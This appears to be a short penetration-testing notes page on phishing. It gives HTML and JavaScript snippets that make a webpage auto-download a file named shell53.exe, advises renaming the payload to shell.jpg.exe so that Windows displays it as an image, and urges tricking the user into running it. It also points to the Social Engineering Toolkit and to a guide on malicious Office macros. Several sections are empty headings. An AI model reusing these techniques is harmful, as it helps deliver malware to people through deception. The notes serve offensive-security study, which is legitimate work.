# Social Engineering - Phishing

Gaining initial access to a network is often done using different kinds of social engineering attacks.

## Auto-download a malicious file

The techical part is not really that difficult here. In order to auto-download a file you just add this script to the malicious webpage

```
<script> document.location.href = 'shell53.exe'; </script>
```

Another way to do it is like this

```
<html>
<head>
<meta http-equiv="refresh" content="0; url=shell53.exe">
</head>
</html>
```

Of course the user will have to accept to download the file, unless the user has previously checked in the box automatically download. The user must then click the file for it to execute. This is where the social engineering part comes in, you really must trick the user into executing the file.

### Change the filename

Since windows by default remove the filename you can call your file shell.jpg.exe, and once downloaded onto the machine windows will display it as "shell.jpg".


## ActiveX


The most common tool for social engineering is to use Social Engineering Toolkit. SET. It comes as default in Kali. Run it like this:


```
setoolkit
```
## Spear phishing

## Word/excel makros

An explanation of how to createa malicious makro-wordfile.

https://www.offensive-security.com/metasploit-unleashed/vbscript-infection-methods/

## Reference:
https://www.youtube.com/watch?v=NTdthBQYa1k